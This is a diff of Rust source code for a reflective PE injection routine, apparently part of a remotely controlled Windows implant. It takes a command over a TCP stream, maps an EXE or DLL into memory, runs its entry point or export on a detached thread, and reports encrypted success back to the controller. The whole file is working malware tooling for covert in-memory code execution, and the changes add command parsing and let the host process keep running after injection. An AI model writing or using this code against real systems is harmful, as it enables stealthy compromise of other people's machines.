@@ -1,10 +1,14 @@
+#[cfg(windows)]
 use std::{ffi::c_void, io::Write, mem::{size_of, transmute}, net::TcpStream, path::Path, ptr::null_mut};
 
+#[cfg(windows)]
 use crate::utils;
+#[cfg(windows)]
 use utils::{image_ordinal, image_snap_by_ordinal, DllMain, Main, BaseRelocationEntry, get_peb};
+#[cfg(windows)]
 use windows::{
     core::PCSTR,
-    Win32::{Foundation::{FARPROC, HINSTANCE}, 
+    Win32::{Foundation::{CloseHandle, FARPROC, HINSTANCE}, 
     System::{
         Diagnostics::Debug::*, 
         LibraryLoader::{GetProcAddress, LoadLibraryA}, 
@@ -14,33 +18,42 @@ use windows::{
         WindowsProgramming::IMAGE_THUNK_DATA64
     }},
 };
+#[cfg(windows)]
 use simple_crypt::encrypt;
 
-pub fn reflective_inject(stream: &mut TcpStream, injected: String, export: String, shared_secret: &[u8; 32]) -> bool {
-    let path = Path::new(injected.as_str());
-    let param = String::from("");
-    let extension = path.extension().and_then(|ext| ext.to_str());
-    match extension {
-        Some("exe") => {
-            println!("Injecting EXE: {}", injected);
-        },
-        Some("dll") => {
-            println!("Injecting DLL {} Function: {}", injected, export);
-        },
-        _ => {
-            panic!("The file provided does not have a valid .exe or .dll extension");
-        },
+#[cfg(windows)]
+pub fn reflective_inject(stream: &mut TcpStream, command: String, shared_secret: &[u8; 32]) {
+    let parts: Vec<&str> = command.splitn(3, ' ').collect();
+    let path = Path::new(parts[1]);
+    let mut param = String::new();
+    let mut export = String::new();
+    if parts.len() > 2 {
+        let extension = path.extension().and_then(|ext| ext.to_str());
+        match extension {
+            Some("exe") => {
+                param = parts[2].to_string();
+                println!("Injecting EXE: {} with args: {}", path.display(), param);
+            },
+            Some("dll") => {
+                export = parts[2].to_string();
+                println!("Injecting DLL {} Function: {}", path.display(), export);
+            },
+            _ => {
+                panic!("The file provided does not have a valid .exe or .dll extension");
+            },
+        }
     }
 
     let buffer = std::fs::read(path).unwrap();
     let mut pe = PE::new(buffer).unwrap();
+    let data = encrypt("Reflective DLL injected successfully!".as_bytes(), shared_secret).unwrap();
+
     pe.local_pe_exec(param, export).unwrap();
 
-    stream.write(&encrypt("Reflective DLL injected successfully!".as_bytes(), shared_secret).unwrap()).unwrap();
-    true
+    stream.write(&data).unwrap();
 }
 
-
+#[cfg(windows)]
 #[derive(Debug)]
 pub struct PE {
     pub file_buffer: Vec<u8>,
@@ -54,6 +67,7 @@ pub struct PE {
     pub is_dll: bool,
 }
 
+#[cfg(windows)]
 impl PE {
     fn new(buffer: Vec<u8>) -> Option<Self> {
         unsafe {
@@ -169,15 +183,18 @@ impl PE {
                         None
                     ).expect("[!] Error when calling CreateThread");
 
-                    WaitForSingleObject(htread, INFINITE);
+                    // Detach the thread so the process continues execution
+                    CloseHandle(htread).unwrap();
                 }
 
             } else {
                 let entry_point = address.offset((*self.nt_header).OptionalHeader.AddressOfEntryPoint as isize);
                 let func = transmute::<_, Main>(entry_point);
-                func();
-            }
 
+                std::thread::spawn(move || {
+                    func();
+                });
+            }
             Ok(())
         }
     }
